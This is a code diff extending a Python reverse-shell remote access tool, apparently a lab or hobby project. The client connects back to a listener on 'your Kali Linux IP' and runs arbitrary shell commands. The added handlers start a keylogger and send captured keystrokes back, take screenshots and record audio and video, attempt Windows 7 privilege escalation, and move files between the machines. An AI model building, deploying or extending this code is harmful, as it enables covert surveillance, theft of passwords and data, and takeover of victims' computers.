@@ -10,6 +10,19 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 
+# Import enhanced features
+try:
+    from keylogger import create_keylogger
+    from recording import create_surveillance_recorder
+    from privilege import Windows7PrivilegeEscalator
+except ImportError as e:
+    print(f"Warning: Enhanced features not available: {e}")
+
+# Global variables for enhanced features
+keylogger = None
+recorder = None
+privilege_escalator = None
+
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -33,8 +46,8 @@ def connection():
     while True:
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
-            # Connect to a remote host with IP '192.168.1.12' and port 5555
-            s.connect(('192.168.1.12', 5555))
+            # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
+            s.connect(('192.168.56.100', 5555))  # Update this to your Kali IP
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -49,6 +62,7 @@ def connection():
 def upload_file(file_name):
     f = open(file_name, 'rb')  # Open the specified file in binary read mode
     s.send(f.read())  # Read and send the file's contents over the network
+    f.close()  # Close the file
 
 
 # Function to download a file from the remote host
@@ -66,11 +80,14 @@ def download_file(file_name):
     f.close()  # Close the file when done
 
 
-# Main shell function for command execution
+# Main shell function for command execution with enhanced features
 def shell():
+    global keylogger, recorder, privilege_escalator
+    
     while True:
         # Receive a command from the remote host
         command = reliable_recv()
+        
         if command == 'quit':
             # If the command is 'quit', exit the shell loop
             break
@@ -79,20 +96,143 @@ def shell():
             pass
         elif command[:3] == 'cd ':
             # If the command starts with 'cd ', change the current directory
-            os.chdir(command[3:])
+            try:
+                os.chdir(command[3:])
+                reliable_send("Directory changed successfully")
+            except Exception as e:
+                reliable_send(f"Error changing directory: {str(e)}")
+                
+        # KEYLOGGER COMMANDS
+        elif command == 'start_keylog':
+            try:
+                if keylogger is None:
+                    keylogger = create_keylogger("keylog.txt")
+                if keylogger.start():
+                    reliable_send("Keylogger started successfully")
+                else:
+                    reliable_send("Failed to start keylogger")
+            except Exception as e:
+                reliable_send(f"Keylogger error: {str(e)}")
+                
+        elif command == 'stop_keylog':
+            try:
+                if keylogger and keylogger.stop():
+                    reliable_send("Keylogger stopped successfully")
+                else:
+                    reliable_send("Keylogger not running or failed to stop")
+            except Exception as e:
+                reliable_send(f"Stop keylogger error: {str(e)}")
+                
+        elif command == 'get_keylog':
+            try:
+                with open('keylog.txt', 'r', encoding='utf-8') as f:
+                    keylog_data = f.read()
+                    if keylog_data:
+                        reliable_send(keylog_data)
+                    else:
+                        reliable_send("Keylog file is empty")
+            except Exception as e:
+                reliable_send(f"Error reading keylog: {str(e)}")
+                
+        # RECORDING COMMANDS
+        elif command == 'screenshot':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                success, msg = recorder.screen_recorder.take_screenshot()
+                reliable_send(f"Screenshot: {msg}")
+            except Exception as e:
+                reliable_send(f"Screenshot error: {str(e)}")
+                
+        elif command == 'start_recording':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
+                reliable_send(f"Recording: {msg}")
+            except Exception as e:
+                reliable_send(f"Recording error: {str(e)}")
+                
+        elif command == 'stop_recording':
+            try:
+                if recorder:
+                    success, msg = recorder.stop_surveillance()
+                    reliable_send(f"Stop recording: {msg}")
+                else:
+                    reliable_send("No recording active")
+            except Exception as e:
+                reliable_send(f"Stop recording error: {str(e)}")
+                
+        elif command == 'list_recordings':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                recordings = recorder.list_recordings()
+                reliable_send(f"Recordings: {json.dumps(recordings, indent=2)}")
+            except Exception as e:
+                reliable_send(f"List recordings error: {str(e)}")
+                
+        # PRIVILEGE ESCALATION COMMANDS
+        elif command == 'check_privs':
+            try:
+                if privilege_escalator is None:
+                    privilege_escalator = Windows7PrivilegeEscalator()
+                reliable_send(f"Current privileges: {privilege_escalator.current_privileges}")
+            except Exception as e:
+                reliable_send(f"Check privileges error: {str(e)}")
+                
+        elif command == 'escalate':
+            try:
+                if privilege_escalator is None:
+                    privilege_escalator = Windows7PrivilegeEscalator()
+                success, results = privilege_escalator.escalate_privileges()
+                reliable_send(f"Escalation result: {success}\nDetails: {str(results)[:1000]}")
+            except Exception as e:
+                reliable_send(f"Escalation error: {str(e)}")
+                
+        elif command == 'privesc_report':
+            try:
+                if privilege_escalator is None:
+                    privilege_escalator = Windows7PrivilegeEscalator()
+                report = privilege_escalator.generate_windows7_report()
+                # Send abbreviated report to avoid overwhelming the connection
+                brief_report = {
+                    'current_privileges': report.get('current_privileges'),
+                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
+                    'total_opportunities': len(report.get('escalation_opportunities', {}))
+                }
+                reliable_send(f"Privilege Report: {json.dumps(brief_report, indent=2)}")
+            except Exception as e:
+                reliable_send(f"Report error: {str(e)}")
+                
+        # FILE OPERATIONS
         elif command[:8] == 'download':
             # If the command starts with 'download', upload a file to the remote host
-            upload_file(command[9:])
+            try:
+                upload_file(command[9:])
+                reliable_send(f"File {command[9:]} uploaded successfully")
+            except Exception as e:
+                reliable_send(f"Download error: {str(e)}")
         elif command[:6] == 'upload':
             # If the command starts with 'upload', download a file from the remote host
-            download_file(command[7:])
+            try:
+                download_file(command[7:])
+                reliable_send(f"File {command[7:]} downloaded successfully")
+            except Exception as e:
+                reliable_send(f"Upload error: {str(e)}")
         else:
             # For other commands, execute them using subprocess
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
-            result = result.decode()  # Decode the output to a string
-            # Send the command execution result back to the remote host
-            reliable_send(result)
+            try:
+                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
+                result = result.decode('utf-8', errors='ignore')  # Decode the output to a string
+                # Send the command execution result back to the remote host
+                if result:
+                    reliable_send(result)
+                else:
+                    reliable_send("Command executed successfully (no output)")
+            except Exception as e:
+                reliable_send(f"Command execution error: {str(e)}")
 
 
 # Create a socket object for communication over IPv4 and TCP
